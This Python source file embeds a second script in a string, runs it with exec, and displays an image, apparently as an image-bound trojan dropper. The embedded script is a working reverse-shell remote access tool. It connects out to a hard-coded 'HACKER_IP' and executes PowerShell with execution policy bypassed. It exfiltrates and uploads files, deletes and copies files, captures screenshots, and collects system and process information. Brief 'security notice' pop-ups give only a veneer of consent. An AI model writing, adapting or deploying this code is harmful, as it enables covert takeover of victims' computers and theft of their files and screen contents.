import ctypes
from datetime import datetime
import platform
import shutil
import sys
import os
import io
import base64
import socket
import tempfile
import subprocess
import time
from tkinter import Tk, Label, PhotoImage, messagebox, Text, Scrollbar
from PIL import Image, ImageTk
import threading
import struct
import pyautogui

# The embedded image (will be replaced with your actual image)
EMBEDDED_IMAGE_BASE64 = "PLACEHOLDER_FOR_IMAGE"

# The embedded script (will be replaced with your actual script)
EMBEDDED_SCRIPT = """import socket
import os
import subprocess
import pyautogui
import shutil
import time
import struct
from datetime import datetime
import sys
import threading
import ctypes
import platform

class EmbeddedScript:
    def __init__(self):
        self.CURRENT_DIR = os.getcwd()
        self.running = True
        self.conn = None
        self.show_warning()

    def show_warning(self):
        \"\"\"Show a warning message to the user before execution\"\"\"
        if platform.system() == 'Windows':
            ctypes.windll.user32.MessageBoxW(
                0,
                "This application will now perform system monitoring for security purposes.\\n"
                "By continuing, you acknowledge this activity.",
                "Security Notice",
                0x40 | 0x1  # MB_ICONINFORMATION | MB_OKCANCEL
            )
        else:
            print("NOTICE: This application performs system monitoring for security purposes")

    def execute_powershell(self, cmd):
        try:
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
                capture_output=True,
                text=True,
                shell=True
            )
            return result.stdout.strip() or result.stderr.strip()
        except Exception as e:
            return f"PowerShell Error: {str(e)}"

    def list_commands(self):
        return \"\"\"
Available Commands:
?                - Show this help menu
ls, dir          - List files in current directory
cd <path>        - Change directory
pwd              - Show current directory
ps <cmd>         - Execute PowerShell command
download <file>  - Download a file
upload <file>    - Upload a file
create <file>    - Create empty file
mkdir <folder>   - Create new folder
delete <file>    - Delete file
copy <src> <dst> - Copy file/folder
screenshot       - Take screenshot
sysinfo          - Get system info
processes        - List processes
exit             - Close connection
\"\"\"

    def execute_command(self, cmd):
        try:
            if cmd == "?":
                return self.list_commands()

            elif cmd.lower() in ["ls", "dir"]:
                return self.execute_powershell("Get-ChildItem -Force | Format-Table -Wrap -AutoSize | Out-String -Width 8192")

            elif cmd.startswith("cd "):
                path = cmd[3:]
                os.chdir(path)
                return f"Current directory: {os.getcwd()}"

            elif cmd == "pwd":
                return os.getcwd()

            elif cmd.startswith("ps "):
                return self.execute_powershell(cmd[3:])

            elif cmd.startswith("download "):
                filepath = cmd[9:]
                if os.path.exists(filepath):
                    try:
                        filesize = os.path.getsize(filepath)
                        self.conn.send(f"FILESIZE {filesize}".encode())
                        with open(filepath, "rb") as f:
                            while chunk := f.read(4096):
                                self.conn.send(chunk)
                        return "File transfer complete"
                    except Exception as e:
                        return f"Error transferring file: {str(e)}"
                return "FileNotFound"

            elif cmd.startswith("upload "):
                parts = cmd.split(" ", 1)
                if len(parts) < 2:
                    return "Usage: upload <file>"
                filename = parts[1]
                self.conn.send("READY".encode())
                file_size = struct.unpack("!I", self.conn.recv(4))[0]
                with open(filename, "wb") as f:
                    received = 0
                    while received < file_size:
                        chunk = self.conn.recv(min(4096, file_size - received))
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                return f"File {filename} uploaded successfully"

            elif cmd.startswith("create "):
                filename = cmd[7:]
                open(filename, "w").close()
                return f"File {filename} created"

            elif cmd.startswith("mkdir "):
                foldername = cmd[6:]
                try:
                    os.makedirs(foldername, exist_ok=True)
                    return f"Folder created: {foldername}"
                except Exception as e:
                    return f"Error creating folder: {str(e)}"

            elif cmd.startswith("delete "):
                filename = cmd[7:]
                if os.path.exists(filename):
                    os.remove(filename)
                    return f"File {filename} deleted"
                return "FileNotFound"

            elif cmd.startswith("copy "):
                parts = cmd.split(" ", 2)
                if len(parts) < 3:
                    return "Usage: copy <src> <dst>"
                src, dst = parts[1], parts[2]
                if os.path.exists(src):
                    if os.path.isdir(src):
                        shutil.copytree(src, dst)
                        return f"Folder copied to {dst}"
                    else:
                        shutil.copy(src, dst)
                        return f"File copied to {dst}"
                return "Source not found"

            elif cmd == "screenshot":
                filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                abs_path = os.path.join(self.CURRENT_DIR, filename)
                pyautogui.screenshot(abs_path)
                with open(abs_path, "rb") as f:
                    data = f.read()
                os.remove(abs_path)
                return data

            elif cmd == "sysinfo":
                return self.execute_powershell("Get-ComputerInfo | Select-Object *")

            elif cmd == "processes":
                return self.execute_powershell("Get-Process | Format-Table Name,CPU,Id | Out-String -Width 8192")

            else:
                return "UnknownCommand"

        except Exception as e:
            return f"Error: {str(e)}"

    def run(self):
        HACKER_IP = "192.168.1.14"  # CHANGE THIS
        HACKER_PORT = 3306

        while self.running:
            try:
                with socket.socket() as s:
                    self.conn = s
                    s.connect((HACKER_IP, HACKER_PORT))

                    while self.running:
                        try:
                            cmd = s.recv(4096).decode().strip()
                            if not cmd:
                                continue

                            if cmd == "exit":
                                break

                            response = self.execute_command(cmd)
                            if isinstance(response, str):
                                s.send(response.encode())
                            else:
                                s.send(struct.pack("!I", len(response)) + response)

                        except Exception as e:
                            time.sleep(1)
                            continue

            except Exception as e:
                time.sleep(10)
                continue

def start_embedded_script():
    try:
        script = EmbeddedScript()
        script.run()
    except Exception as e:
        print(f"Script error: {str(e)}")

start_embedded_script()
"""

def show_image(image_data):
    """Display the embedded image in a window"""
    root = Tk()
    root.title("Image Display")
    
    # Decode the base64 image data
    image_bytes = base64.b64decode(image_data)
    image = Image.open(io.BytesIO(image_bytes))
    photo = ImageTk.PhotoImage(image)
    
    label = Label(root, image=photo)
    label.image = photo  # keep a reference!
    label.pack()
    
    # Make window stay on top
    root.attributes('-topmost', True)
    root.after(100, lambda: root.attributes('-topmost', False))
    
    root.mainloop()

def alert_user():
    """Show an alert message before running the embedded script"""
    alert_window = Tk()
    alert_window.withdraw()  # Hide the root window
    messagebox.showinfo("Notice", "The embedded script will now run in the background.")
    alert_window.destroy()

def display_script(script_code):
    """Display the embedded script in a scrollable text window"""
    script_window = Tk()
    script_window.title("Embedded Script")
    
    # Create a Text widget with a scrollbar
    text_widget = Text(script_window, wrap="word", width=80, height=20)
    text_widget.insert("1.0", script_code)  # Insert the script into the text widget
    text_widget.config(state="disabled")  # Make it read-only
    
    scrollbar = Scrollbar(script_window, command=text_widget.yview)
    text_widget.config(yscrollcommand=scrollbar.set)
    
    text_widget.pack(padx=10, pady=10)
    scrollbar.pack(side="right", fill="y")
    
    # Show the script window
    script_window.mainloop()

def run_embedded_script(script_code):
    alert_user()
    """Execute the embedded Python script"""
    try:
        # Create namespace for the embedded script
        namespace = {
            "__name__": "__embedded_script__",
            "os": os,
            "sys": sys,
            "socket": socket,
            "subprocess": subprocess,
            "pyautogui": pyautogui,
            "shutil": shutil,
            "time": time,
            "struct": struct,
            "datetime": datetime,
            "threading": threading,
            "ctypes": ctypes,
            "platform": platform
        }
        
        # Execute the script directly in our namespace
        exec(script_code, namespace)
        
        # Start the script in a new thread
        if 'start_embedded_script' in namespace:
            script_thread = threading.Thread(target=namespace['start_embedded_script'])
            script_thread.daemon = True
            script_thread.start()
        else:
            print("Embedded script does not define 'start_embedded_script'")

    except Exception as e:
        print(f"Error running embedded script: {e}")

def main():
    if os.environ.get("EMBEDDED_CHILD") == "1":
        # Child: only show image
        messagebox.showinfo("waw")
        show_image(EMBEDDED_IMAGE_BASE64)
    else:
        # Parent: show the embedded script first, then run it in a separate thread
        messagebox.showinfo("wew")
        
        # Display the embedded script before running it
        display_script(EMBEDDED_SCRIPT)
        
        # Now run the embedded script after the user sees it
        run_embedded_script(EMBEDDED_SCRIPT)
        
        # Show the image after running the script
        show_image(EMBEDDED_IMAGE_BASE64)

if __name__ == "__main__":
    main()